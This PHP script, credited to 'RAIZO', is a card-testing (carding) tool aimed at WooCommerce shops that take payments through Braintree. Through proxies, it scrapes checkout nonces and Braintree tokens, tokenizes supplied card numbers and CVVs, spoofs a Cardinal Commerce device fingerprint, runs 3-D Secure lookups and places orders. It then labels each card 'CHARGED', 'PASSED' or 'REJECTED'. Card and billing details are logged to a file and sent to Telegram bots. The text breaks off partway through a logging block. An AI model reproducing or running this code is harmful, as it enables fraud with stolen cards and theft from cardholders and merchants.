<?php

# ------------- [ CODE BY RAIZO ]

error_reporting(0);
date_default_timezone_set('Asia/Manila');

include 'include/function.php';
include 'include/useragent.php';

ob_start();
include 'include/atc.php';

$urlComponents = parse_url($final_url);
$site2 = $urlComponents['host'];

include 'include/address.php';

# -------------------- [ ATC ] --------------- #
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $final_url);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
   'User-Agent: '.$ua,
   'X-Requested-With: XMLHttpRequest',
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_PROXY, $proxy_port);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $user_pass);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, "".$curttt1."/COOKIE/".$inst['cookie']."");
curl_setopt($ch, CURLOPT_COOKIEJAR, "".$curttt1."/COOKIE/".$inst['cookie']."");
$ATC = curl_exec($ch);
curl_close($ch);

if ($ATC) {
    $checkoutPattern = '/<a href="([^"]+)" class="button (checkout|btn-checkout) wc-forward">Checkout<\/a>|<a href="([^"]+)">Checkout<\/a>|<form[^>]+action="([^"]+)"[^>]*>/';

    if (preg_match($checkoutPattern, $response, $checkoutMatch)) {

        $checkout1 = $checkoutMatch[1] ?: $checkoutMatch[3] ?: $checkoutMatch[4];
         $checkout1;
    } else {
        $checkout1 = "https://$hostname/checkout";
    }
}

# -------------------- [ CHKOUT  ] -------------------#

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $checkout1);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
   'User-Agent: '.$ua,
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_PROXY, $proxy_port);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $user_pass);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, "".$curttt1."/COOKIE/".$inst['cookie']."");
curl_setopt($ch, CURLOPT_COOKIEJAR, "".$curttt1."/COOKIE/".$inst['cookie']."");

$Checkout = curl_exec($ch);
curl_close($ch);

$nonce = trim(strip_tags(getStr($Checkout,'<input type="hidden" id="woocommerce-process-checkout-nonce" name="woocommerce-process-checkout-nonce" value="','" />')));
$patterns = '/<tr class="order-total">.*?<th>Total<\/th>\s*<td>\s*<strong>\s*<span class="woocommerce-Price-amount amount">\s*<bdi>\s*<span class="woocommerce-Price-currencySymbol">(.+?)<\/span>\s*([\d.]+)/s';
if (preg_match($patterns, $Checkout, $matches)) {
    $currency_symbol = $matches[1];
    $amount = $matches[2];
    if ($currency_symbol == '&pound;') {
        $currency_symbol = '£';
    }
}    
  $price1 = $currency_symbol . $amount;
  
$b3data = trim(strip_tags(getStr($Checkout,'var wc_braintree_client_token = ["','"];
')));
$process = base64_decode($b3data);
$bearer = GetStr($process,'"authorizationFingerprint":"','"');
// Decode the JSON response
$response = json_decode($process, true);

// Extract the value of merchantId
$merchantId = $response['merchantId'];
$clientid = GetStr($process,'"clientId":"','",');
$b3cli_id = GetStr($process,'"braintreeClientId":"','",'); 

$validationNonce = preg_match('/"address_validation_nonce":\s*"([^"]+)"/', $Checkout, $matches) ? $matches[1] : null;

#------------- [ VALIDATION ] ---------------#

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "https://$hostname/wp-admin/admin-ajax.php");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'user-agent: '.$ua,
    'x-requested-with: XMLHttpRequest',
]);

curl_setopt($ch, CURLOPT_PROXY, $proxy_port);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $user_pass);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');
curl_setopt($ch, CURLOPT_COOKIEFILE, "".$curttt1."/COOKIE/".$inst['cookie']."");
curl_setopt($ch, CURLOPT_COOKIEJAR, "".$curttt1."/COOKIE/".$inst['cookie']."");
curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query([
    'action' => 'wc_avatax_validate_customer_address',
    'nonce' => $validationNonce,
    'type' => 'billing',
    'address_1' => $street,
    'address_2' => $street,
    'city' => $city,
    'state' => $state,
    'country' => $country,
    'postcode' => $zip,
]));

$validate = curl_exec($ch);
curl_close($ch);
# --------------- [ retries ] ----------- #

$retries = 0;

goers:

# ------------------ [ GRAPHQL ] ------------- #

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://payments.braintree-api.com/graphql');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
   'POST /graphql HTTP/1.1',
   'Host: payments.braintree-api.com',
   'User-Agent: '.$ua,
   'Authorization: Bearer '.$bearer,
   'Braintree-Version: 2018-05-10',
   'Content-Type: application/json',
   'Accept: */*',
   'Origin: https://assets.braintreegateway.com',
   'Referer: https://assets.braintreegateway.com/',
   'Accept-Language: en-US,en;q=0.9',
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_PROXY, $proxy_port);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $user_pass);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, "".$curttt1."/COOKIE/".$inst['cookie']."");
curl_setopt($ch, CURLOPT_COOKIEJAR, "".$curttt1."/COOKIE/".$inst['cookie']."");
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"clientSdkMetadata":{"source":"client","integration":"custom","sessionId":"'.$DeviceSessionID.'"},"query":"mutation TokenizeCreditCard($input: TokenizeCreditCardInput\u0021) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }","variables":{"input":{"creditCard":{"number":"'.$cc.'","expirationMonth":"'.$mes_with_zero.'","expirationYear":"'.$ano_no_20.'","cvv":"'.$cvv.'","billingAddress":{"postalCode":"'.$zip.'","streetAddress":"'.$street.'"}},"options":{"validate":false}}},"operationName":"TokenizeCreditCard"}');

$Grap = curl_exec($ch);
$Token = trim(strip_tags(getstr($Grap, '"token":"','"')));

#----------------- [ UUID ] ----------------#

// Generate a UUID
$reference_id = sprintf(
    '%04x%04x-%04x-%04x-%04x-%04x%04x%04x',
    mt_rand(0, 0xffff), mt_rand(0, 0xffff),
    mt_rand(0, 0xffff),
    mt_rand(0, 0x0fff) | 0x4000,
    mt_rand(0, 0x3fff) | 0x8000,
    mt_rand(0, 0xffff), mt_rand(0, 0xffff), mt_rand(0, 0xffff)
);

// Define the hostname (replace with your actual hostname)
$hostname2 = "$hostname";

// Prepare the payload
$data = [
    "Cookies" => [
        "Legacy" => true,
        "LocalStorage" => true,
        "SessionStorage" => true
    ],
    "DeviceChannel" => "Browser",
    "Extended" => [
        "Browser" => [
            "Adblock" => true,
            "AvailableJsFonts" => [],
            "DoNotTrack" => "unknown",
            "JavaEnabled" => false
        ],
        "Device" => [
            "ColorDepth" => 24,
            "Cpu" => "unknown",
            "Platform" => "Win32",
            "TouchSupport" => [
                "MaxTouchPoints" => 0,
                "OnTouchStartAvailable" => false,
                "TouchEventCreationSuccessful" => false
            ]
        ]
    ],
    "Fingerprint" => "7c79288432f448a03f8ce9a409873a1a",
    "FingerprintingTime" => 220,
    "FingerprintDetails" => ["Version" => "1.5.1"],
    "Language" => "en-US",
    "Latitude" => null,
    "Longitude" => null,
    "OrgUnitId" => "617c1af9299c0c318f3be597",
    "Origin" => "Songbird",
    "Plugins" => [
        "bVSRIEK::TsWq89999HqdOmyCJECgQIECgYz4cOu::~a05",
        "ZrVxgvfu::IMtePPuXTw3bNtePHDBfXq0iZUpzhQIM::~4k5",
        "JavaScript doc Viewer::Portable Document Format::application/x-google-chrome-pdf~pdf",
        "OpenSource doc Viewer::::application/pdf~pdf"
    ],
    "ReferenceId" => "0_" . $reference_id,
    "Referrer" => "https://{$hostname2}/",
    "Screen" => [
        "FakedResolution" => false,
        "Ratio" => 1.8823529411764706,
        "Resolution" => "1536x816",
        "UsableResolution" => "1536x816",
        "CCAScreenSize" => "02"
    ],
    "CallSignEnabled" => null,
    "ThreatMetrixEnabled" => false,
    "ThreatMetrixEventType" => "PAYMENT",
    "ThreatMetrixAlias" => "Default",
    "TimeOffset" => -480,
    "UserAgent" => "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36",
    "UserAgentDetails" => ["FakedOS" => false, "FakedBrowser" => false],
    "BinSessionId" => "339cb524-c910-4c4d-ad98-975647223c76"
];

// Initialize cURL
$ch = curl_init();

// Set cURL options
curl_setopt($ch, CURLOPT_URL, "https://geoissuer.cardinalcommerce.com/DeviceFingerprintWeb/V2/Browser/SaveBrowserData");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'Content-Type: application/json'
]);
curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($data));

// Execute cURL request and get the response
$response = curl_exec($ch);

// Close cURL
curl_close($ch);

#----------------- [ 3D SECURE ] --------------#

if (strpos($process, '"threeDSecureEnabled":true')) {
    $ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "https://api.braintreegateway.com/merchants/$merchantId/client_api/v1/payment_methods/$Token/three_d_secure/lookup");
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
   'Host: api.braintreegateway.com',
   'User-Agent: '.$ua,
   'Content-Type: application/json',
   'Accept: */*',
   'Origin: https://'.$hostname,
   'Referer: https://'.$hostname,
   'Accept-Language: en-US,en;q=0.9',
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_PROXY, $proxy_port);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $user_pass);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, "".$curttt1."/COOKIE/".$inst['cookie']."");
curl_setopt($ch, CURLOPT_COOKIEJAR, "".$curttt1."/COOKIE/".$inst['cookie']."");
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"amount":"'.$amount.'","browserColorDepth":24,"browserJavaEnabled":false,"browserJavascriptEnabled":true,"browserLanguage":"en-US","browserScreenHeight":873,"browserScreenWidth":393,"browserTimeZone":-480,"deviceChannel":"Browser","additionalInfo":{"shippingGivenName":"'.$fname.'","shippingSurname":"'.$lname.'","ipAddress":"'.$query.'","billingLine1":"'.$street.'","billingLine2":"","billingCity":"'.$city.'","billingState":"'.$state.'","billingPostalCode":"'.$zip.'","billingCountryCode":"'.$country.'","billingPhoneNumber":"'.$phone.'","billingGivenName":"'.$fname.'","billingSurname":"'.$lname.'","shippingLine1":"'.$street.'","shippingLine2":"","shippingCity":"'.$city.'","shippingState":"","shippingPostalCode":"'.$zip.'","shippingCountryCode":"'.$country.'","email":"'.$email.'"},"bin":"'.$cc6.'","dfReferenceId":"0_'.$reference_id.'","clientMetadata":{"requestedThreeDSecureVersion":"2","sdkVersion":"web/3.106.0","cardinalDeviceDataCollectionTimeElapsed":13,"issuerDeviceDataCollectionTimeElapsed":1,"issuerDeviceDataCollectionResult":true},"authorizationFingerprint":"'.$bearer.'","braintreeLibraryVersion":"braintree/web/3.106.0","_meta":{"merchantAppId":"'.$hostname.'","platform":"web","sdkVersion":"3.106.0","source":"client","integration":"custom","integrationType":"custom","sessionId":"'.$DeviceSessionID.'"}}' );

$lookup = curl_exec($ch);
$data = json_decode($lookup, true);

if (json_last_error() === JSON_ERROR_NONE) {
    // Kunin ang liabilityShifted mula sa threeDSecureInfo
    $liabilityShifted = isset($data['paymentMethod']['threeDSecureInfo']['liabilityShifted']) ? $data['paymentMethod']['threeDSecureInfo']['liabilityShifted'] : null;

    // Kunin ang status mula sa threeDSecureInfo
    $status = isset($data['paymentMethod']['threeDSecureInfo']['status']) ? $data['paymentMethod']['threeDSecureInfo']['status'] : null;

    // Kunin ang cardType mula sa details
    $cardType = isset($data['paymentMethod']['details']['cardType']) ? $data['paymentMethod']['details']['cardType'] : null;

    // Kunin ang issuingBank mula sa binData
    $issuingBank = isset($data['paymentMethod']['binData']['issuingBank']) ? $data['paymentMethod']['binData']['issuingBank'] : null;

    // Kunin ang countryOfIssuance mula sa binData
    $countryOfIssuance = isset($data['paymentMethod']['binData']['countryOfIssuance']) ? $data['paymentMethod']['binData']['countryOfIssuance'] : null;

    // Kunin ang prepaid mula sa binData
    $prepaid = isset($data['paymentMethod']['binData']['prepaid']) ? $data['paymentMethod']['binData']['prepaid'] : null;

    // Kunin ang debit mula sa binData
    $debit = isset($data['paymentMethod']['binData']['debit']) ? $data['paymentMethod']['binData']['debit'] : null;
} else {
    $liabilityShifted = null;
    $status = null;
    $cardType = null;
    $issuingBank = null;
    $countryOfIssuance = null;
    $prepaid = null;
    $debit = null;
}


if (json_last_error() === JSON_ERROR_NONE && isset($data['paymentMethod']['nonce'])) {
    $cnonce = $data['paymentMethod']['nonce'];
    $Token = $cnonce;
} else {
    $Token = null;
}
curl_close($ch);
    }


# ---------------- [ WC AJAX ] --------- #

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "https://$hostname/?wc-ajax=checkout");
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
    'User-Agent: '.$ua,
    'X-Requested-With: XMLHttpRequest',
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_PROXY, $proxy_port);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $user_pass);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, "".$curttt1."/COOKIE/".$inst['cookie']."");
curl_setopt($ch, CURLOPT_COOKIEJAR, "".$curttt1."/COOKIE/".$inst['cookie']."");
curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query([
    'billing_first_name' => $fname,
    'billing_last_name' => $lname,
    'billing_company' => 'POTANGINAMO',
    'billing_customer_type' => 'personal',
    'billing_vat_number_uid' => 'DE392324340',
    'billing_sk_company_id' => '',
    'billing_sk_company_dic' => '',
    'billing_cz_company_id' => '',
    'billing_eu_vat' => '',
    'billing_it_codice_fiscale' => '',
    'billing_es_nif_nie' => '',
    'billing_it_sid_pec' => '',
    'billing_gr_tax_office' => '',
    'billing_gr_business_activity' => '',
    'billing_country' => $country,
    'billing_address_1' => $street,
    'billing_address_2' => '',
    'billing_postcode' => $zip,
    'billing_city' => $city,
    'billing_state' => $state,
    'billing_phone' => $phone,
    'billing_email' => $email,
    'account_username' => $full_name.''.$phone,
    'account_password' => $full_name.''.$phone,
    'mailchimp_woocommerce_newsletter' => 1,
    'payment_method' => 'braintree_cc',
    'braintree_cc_nonce_key' => $Token,
    'braintree_cc_device_data' => '{"device_session_id":"'.$DeviceSessionID.'","correlation_id":"7a10fe856bea989a8ec3ff788bac4141"}',
    'braintree_cc_3ds_nonce_key' => '',
    'braintree_cc_config_data' => '{"challenges":["cvv"],"environment":"production","clientApiUrl":"https://api.braintreegateway.com:443/merchants/'.$merchantId.'/client_api","assetsUrl":"https://assets.braintreegateway.com","authUrl":"https://auth.venmo.com","analytics":{"url":"https://client-analytics.braintreegateway.com/'.$merchantId.'"},"threeDSecureEnabled":true,"paypalEnabled":true,"paypal":{"displayName":"Mazorcollection","clientId":"'.$clientid.'","baseUrl":"https://assets.braintreegateway.com","assetsUrl":"https://checkout.paypal.com","directBaseUrl":null,"allowHttp":false,"environmentNoNetwork":false,"environment":"live","unvettedMerchant":false,"braintreeClientId":"'.$b3cli_id.'","billingAgreementsEnabled":true,"merchantAccountId":"stripegmailcom","currencyIsoCode":"EUR"},"merchantId":"'.$merchantId.'","venmo":"off","creditCards":{"supportedCardTypes":["American Express","Discover","Maestro","UK Maestro","MasterCard","Visa"],"supportedGateways":[{"name":"clientApi"}],"collectDeviceData":true},"kount":{},"fraudProvider":{},"cardinalAuthenticationJWT":"eyJhbGciOiJIUzI1NiJ9.eyJqdGkiOiI5NDRiMDA1NS1iZTE3LTQ1NmUtYTQ0YS0wMDVkOTViMjA3ZDQiLCJpYXQiOjE3MjMzNTczNTksImV4cCI6MTcyMzM2NDU1OSwiaXNzIjoiNWRkYzZiNmI1MDczOGEyNzM4MjY2NDA5IiwiT3JnVW5pdElkIjoiNWRkYzZiNmE1MDczOGEyNzM4MjY2NDA4In0._tu_e5zGzw203crGSxeWK1gGPnltgIVcAOp0pK1XlFM","threeDSecure":{"cardinalAuthenticationJWT":"eyJhbGciOiJIUzI1NiJ9.eyJqdGkiOiI5NDRiMDA1NS1iZTE3LTQ1NmUtYTQ0YS0wMDVkOTViMjA3ZDQiLCJpYXQiOjE3MjMzNTczNTksImV4cCI6MTcyMzM2NDU1OSwiaXNzIjoiNWRkYzZiNmI1MDczOGEyNzM4MjY2NDA5IiwiT3JnVW5pdElkIjoiNWRkYzZiNmE1MDczOGEyNzM4MjY2NDA4In0._tu_e5zGzw203crGSxeWK1gGPnltgIVcAOp0pK1XlFM"},"graphQL":{"url":"https://payments.braintree-api.com/graphql","date":"2018-05-08","features":["tokenize_credit_cards"]}}',
    'terms' => 'on',
    'terms-field' => 1,
    'woocommerce-process-checkout-nonce' => $nonce,
    '_wp_http_referer' => '/?wc-ajax=update_order_review',
    '_wp_http_referer' => '/checkout/'
]));

$Payment = curl_exec($ch);
curl_close($ch);

if (empty($Payment)) {
     "Payment data is empty!";
} else {
    $PaymentDecoded = html_entity_decode($Payment, ENT_QUOTES, 'UTF-8');
    $PaymentDecoded = preg_replace('/<script\b[^>]*>(.*?)<\/script>/is', '', $PaymentDecoded);
    $decodedPayment = json_decode($PaymentDecoded, true);
    if (json_last_error() === JSON_ERROR_NONE) {
        if (isset($decodedPayment['messages'])) {
            $Respo = strip_tags($decodedPayment['messages']);
            $Respo = preg_replace('/\s+/', ' ', $Respo);
            $Respo = trim($Respo);
            $Respo = htmlentities($Respo, ENT_QUOTES, 'UTF-8');
             "Message: " . $Respo . "<br>";
        } else {
             "The 'messages' field is missing in the payment data.<br>";
        }
        if (isset($decodedPayment['redirect'])) {
            $receipt = $decodedPayment['redirect'];
            $receipt = htmlentities($receipt, ENT_QUOTES, 'UTF-8');
             "Redirect URL: " . $receipt;
        } else {
             "The 'redirect' field is missing in the payment data.";
        }
    } else {
         "Error decoding JSON: " . json_last_error_msg();
    }
}
$linky = trim(strip_tags(getstr($Payment, '"redirect":"','",')));
$orderid = trim(strip_tags(getstr($Payment, '"order_id":','}')));
$decodedResponse = json_decode($Payment, true);

if (isset($decodedResponse['redirect'])) {
    $receipt = $decodedResponse['redirect'];
}
 $receiptUrl = urldecode($receipt);


# ------------ [ UNLINK COOKIE ] ---------- #

unlink("".$curttt1."/COOKIE/".$inst['cookie']."");
ob_flush();

include 'include/tgforwarder.php';

#----------------- [ RESPONSE ]

if (strpos($Payment, '"result":"success","redirect"') !== false && strpos($Payment, 'order-received') !== false) { 
    echo '
        <div style="font-size: 14px;">
            ' . $badge_cvv . ' ' . $lista . ' [ CHARGED ] [AMOUNT: '.$price1.'] [' . $ip . ']  <a href="' . $hostname1 . '" target="_blank">SITE</a> <a href="' . $receiptUrl . '" target="_blank">RECEIPT</a> <br>
        </div>
    ';

    if ($liabilityShifted !== null && strpos($liabilityShifted ? 'YES' : 'NO', 'YES') !== false) { 
    echo '_________________________________________<br><br>';
    echo '<span style="' . $fontStyle . '">#PASSED ✅</span><br>';
    echo '<span style="' . $fontStyle . '">CARD ⇾ </span>' . strtoupper($lista) . '<br>';
    echo '<span style="' . $fontStyle . '">RESPONSE ⇾ </span>' . strtoupper($status) . '<br><br>';
    echo '<span style="' . $fontStyle . '">INFO ⇾ </span>' . strtoupper($cardType);
    if ($debit === 'Yes') {
        echo ' ⇾ DEBIT';
    }
    if ($prepaid === 'Yes') {
        echo ' ⇾ PREPAID';
    }
    echo '<br><span style="' . $fontStyle . '">ISSUER ⇾ </span>' . strtoupper($issuingBank) . '<br>';
    echo '<span style="' . $fontStyle . '">COUNTRY ⇾ </span>' . strtoupper($countryOfIssuance) . '<br>';
    echo '<span style="' . $fontStyle . '">TIME ⇾ </span>' . $time_total . ' SECONDS<br><br>';
    echo '_________________________________________<br><br>';
} elseif ($liabilityShifted !== null) {
    echo '_________________________________________<br><br>';
    echo '<span style="' . $fontStyle . '">#REJECTED ❌</span><br>';
    echo '<span style="' . $fontStyle . '">CARD ⇾ </span>' . strtoupper($lista) . '<br>';
    echo '<span style="' . $fontStyle . '">RESPONSE ⇾ </span>' . strtoupper($status) . '<br><br>';
    echo '<span style="' . $fontStyle . '">INFO ⇾ </span>' . strtoupper($cardType);
    if ($debit === 'Yes') {
        echo ' ⇾ DEBIT';
    }
    if ($prepaid === 'Yes') {
        echo ' ⇾ PREPAID';
    }
    echo '<br><span style="' . $fontStyle . '">ISSUER ⇾ </span>' . strtoupper($issuingBank) . '<br>';
    echo '<span style="' . $fontStyle . '">COUNTRY ⇾ </span>' . strtoupper($countryOfIssuance) . '<br>';
    echo '<span style="' . $fontStyle . '">TIME ⇾ </span>' . $time_total . ' SECONDS<br><br>';
    echo '_________________________________________<br><br>';
}


$log_entry = "*GATEWAY : B3 CC*\n";
$log_entry .= "*CVV* : `" . $escaped_lista . "`\n";
$log_entry .= "*Hostname* : `" . $escaped_hostname . "`\n";
$log_entry .= "*Name* : `" . $escaped_fname . "`\n";
$log_entry .= "*Lastname* : `" . $escaped_lname . "`\n";
$log_entry .= "*Street* : `" . $escaped_street . "`\n";
$log_entry .= "*City* : `" . $escaped_city . "`\n";
$log_entry .= "*State* : `" . $escaped_state . "`\n";
$log_entry .= "*Zip* : `" . $escaped_zip . "`\n";
$log_entry .= "*Country* : `" . $escaped_country . "`\n";
$log_entry .= "*Phone* : `" . $escaped_phone . "`\n";
$log_entry .= "*Email* : `" . $escaped_email . "`\n";

file_put_contents('cvvb3cc.txt', $log_entry, FILE_APPEND | LOCK_EX);
sendToTelegram($additional_bot_token, $additional_chat_id, $log_entry);
sendToTelegram($default_bot_token, $default_chat_id, $log_entry);
} elseif (strpos($Payment, "Gateway Rejected: avs_and_cvv") !== false) {
    echo '
        <div style="font-size: 14px;">
            ' . $badge_cvv . ' ' . $lista . ' [ Gateway Rejected: avs_and_cvv ] [AMOUNT: '.$price1.'] [' . $ip . '] <a href="' . $hostname1 . '" target="_blank">SITE</a> <br>
        </div>
    ';
    
if ($liabilityShifted !== null && strpos($liabilityShifted ? 'YES' : 'NO', 'YES') !== false) { 
    echo '_________________________________________<br><br>';
    echo '<span style="' . $fontStyle . '">#PASSED ✅</span><br>';
    echo '<span style="' . $fontStyle . '">CARD ⇾ </span>' . strtoupper($lista) . '<br>';
    echo '<span style="' . $fontStyle . '">RESPONSE ⇾ </span>' . strtoupper($status) . '<br><br>';
    echo '<span style="' . $fontStyle . '">INFO ⇾ </span>' . strtoupper($cardType);
    if ($debit === 'Yes') {
        echo ' ⇾ DEBIT';
    }
    if ($prepaid === 'Yes') {
        echo ' ⇾ PREPAID';
    }
    echo '<br><span style="' . $fontStyle . '">ISSUER ⇾ </span>' . strtoupper($issuingBank) . '<br>';
    echo '<span style="' . $fontStyle . '">COUNTRY ⇾ </span>' . strtoupper($countryOfIssuance) . '<br>';
    echo '<span style="' . $fontStyle . '">TIME ⇾ </span>' . $time_total . ' SECONDS<br><br>';
    echo '_________________________________________<br><br>';
} elseif ($liabilityShifted !== null) {
    echo '_________________________________________<br><br>';
    echo '<span style="' . $fontStyle . '">#REJECTED ❌</span><br>';
    echo '<span style="' . $fontStyle . '">CARD ⇾ </span>' . strtoupper($lista) . '<br>';
    echo '<span style="' . $fontStyle . '">RESPONSE ⇾ </span>' . strtoupper($status) . '<br><br>';
    echo '<span style="' . $fontStyle . '">INFO ⇾ </span>' . strtoupper($cardType);
    if ($debit === 'Yes') {
        echo ' ⇾ DEBIT';
    }
    if ($prepaid === 'Yes') {
        echo ' ⇾ PREPAID';
    }
    echo '<br><span style="' . $fontStyle . '">ISSUER ⇾ </span>' . strtoupper($issuingBank) . '<br>';
    echo '<span style="' . $fontStyle . '">COUNTRY ⇾ </span>' . strtoupper($countryOfIssuance) . '<br>';
    echo '<span style="' . $fontStyle . '">TIME ⇾ </span>' . $time_total . ' SECONDS<br><br>';
    echo '_________________________________________<br><br>';
}

    
$log_entry = "*GATEWAY : B3 CC*\n";
$log_entry .= "*CVV* : `" . $escaped_lista . "`\n";
$log_entry .= "*Hostname* : `" . $escaped_hostname . "`\n";
$log_entry .= "*Name* : `" . $escaped_fname . "`\n";
$log_entry .= "*Lastname* : `" . $escaped_lname . "`\n";
$log_entry .= "*Street* : `" . $escaped_street . "`\n";
$log_entry .= "*City* : `" . $escaped_city . "`\n";
$log_entry .= "*State* : `" . $escaped_state . "`\n";
$log_entry .= "*Zip* : `" . $escaped_zip . "`\n";
$log_entry .= "*Country* : `" . $escaped_country . "`\n";
$log_entry .= "*Phone* : `" . $escaped_phone . "`\n";
$log_entry .= "*Email* : `" . $escaped_email . "`\n";

file_put_contents('cvvb3cc.txt', $log_entry, FILE_APPEND | LOCK_EX);
sendToTelegram($additional_bot_token, $additional_chat_id, $log_entry);
sendToTelegram($default_bot_token, $default_chat_id, $log_entry);
} elseif (strpos($Payment, "Address Validation") !== false) {
    echo '
        <div style="font-size: 14px;">
            ' . $badge_cvv . ' ' . $lista . ' [ Address Validation ] [AMOUNT: '.$price1.'] [' . $ip . '] <a href="' . $hostname1 . '" target="_blank">SITE</a> <br>
        </div>
    ';
    
if ($liabilityShifted !== null && strpos($liabilityShifted ? 'YES' : 'NO', 'YES') !== false) { 
    echo '_________________________________________<br><br>';
    echo '<span style="' . $fontStyle . '">#PASSED ✅</span><br>';
    echo '<span style="' . $fontStyle . '">CARD ⇾ </span>' . strtoupper($lista) . '<br>';
    echo '<span style="' . $fontStyle . '">RESPONSE ⇾ </span>' . strtoupper($status) . '<br><br>';
    echo '<span style="' . $fontStyle . '">INFO ⇾ </span>' . strtoupper($cardType);
    if ($debit === 'Yes') {
        echo ' ⇾ DEBIT';
    }
    if ($prepaid === 'Yes') {
        echo ' ⇾ PREPAID';
    }
    echo '<br><span style="' . $fontStyle . '">ISSUER ⇾ </span>' . strtoupper($issuingBank) . '<br>';
    echo '<span style="' . $fontStyle . '">COUNTRY ⇾ </span>' . strtoupper($countryOfIssuance) . '<br>';
    echo '<span style="' . $fontStyle . '">TIME ⇾ </span>' . $time_total . ' SECONDS<br><br>';
    echo '_________________________________________<br><br>';
} elseif ($liabilityShifted !== null) {
    echo '_________________________________________<br><br>';
    echo '<span style="' . $fontStyle . '">#REJECTED ❌</span><br>';
    echo '<span style="' . $fontStyle . '">CARD ⇾ </span>' . strtoupper($lista) . '<br>';
    echo '<span style="' . $fontStyle . '">RESPONSE ⇾ </span>' . strtoupper($status) . '<br><br>';
    echo '<span style="' . $fontStyle . '">INFO ⇾ </span>' . strtoupper($cardType);
    if ($debit === 'Yes') {
        echo ' ⇾ DEBIT';
    }
    if ($prepaid === 'Yes') {
        echo ' ⇾ PREPAID';
    }
    echo '<br><span style="' . $fontStyle . '">ISSUER ⇾ </span>' . strtoupper($issuingBank) . '<br>';
    echo '<span style="' . $fontStyle . '">COUNTRY ⇾ </span>' . strtoupper($countryOfIssuance) . '<br>';
    echo '<span style="' . $fontStyle . '">TIME ⇾ </span>' . $time_total . ' SECONDS<br><br>';
    echo '_________________________________________<br><br>';
}

    
$log_entry = "*GATEWAY : B3 CC*\n";
$log_entry .= "*CVV* : `" . $escaped_lista . "`\n";
$log_entry .= "*Hostname* : `" . $escaped_hostname . "`\n";
$log_entry .= "*Name* : `" . $escaped_fname . "`\n";
